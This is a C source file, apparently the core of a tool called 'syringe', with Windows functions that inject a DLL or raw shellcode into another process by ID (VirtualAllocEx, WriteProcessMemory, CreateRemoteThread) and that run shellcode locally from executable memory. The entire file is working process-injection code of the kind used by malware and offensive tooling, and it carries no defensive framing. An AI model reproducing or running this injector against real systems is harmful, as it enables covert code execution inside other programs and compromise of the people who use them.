#include "syringe_core.h"

DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	LPVOID pRemoteBuffer;
	LPVOID pLoadLibAddr;

	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	pLoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibAddr) {
		return 3;
	}
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, strlen(pDll), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}

	if (!WriteProcessMemory(hProc, pRemoteBuffer, pDll, strlen(pDll), NULL)) {
		return 5;
	}
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibAddr, pRemoteBuffer, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);
	return 0;
}

DWORD InjectShellcode(PBYTE pShellcode, SIZE_T szShellcodeLength, DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;

	// Step 1, get a handle to a process
	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	// Step 2, write the shellcode to the remote process
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, pShellcode, szShellcodeLength, NULL)) {
		return 5;
	}

	// Step 3, start the assembly stub in via a call to CreateRemoteThread()
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);

	// Step 4, Profit.
	return 0;
}

DWORD ExecuteShellcode(PBYTE pShellcode, SIZE_T szShellcodeLength, BOOL quiet) {
	HANDLE hLocalThread;
	DWORD dwThreadId;
	PVOID pBuffer;

	pBuffer = VirtualAlloc(NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	memcpy(pBuffer, pShellcode, szShellcodeLength);
	hLocalThread = CreateThread(NULL, 0, LocalExecPayloadStub, pBuffer, 0, &dwThreadId);

	if (!quiet) {
		printf("Waiting for the shellcode to return... ");
	}
	WaitForSingleObject(hLocalThread, INFINITE);
	if (!quiet) {
		printf("Done.\n");
	}
	VirtualFree(pBuffer, 0, MEM_RELEASE);
	return 0;
}

DWORD WINAPI LocalExecPayloadStub(LPVOID lpParameter) {
	__try {
		VOID(*lpCode)() = (VOID(*)())lpParameter;
		lpCode();
	}
	__except(EXCEPTION_EXECUTE_HANDLER) {
	}

	return 0;
}
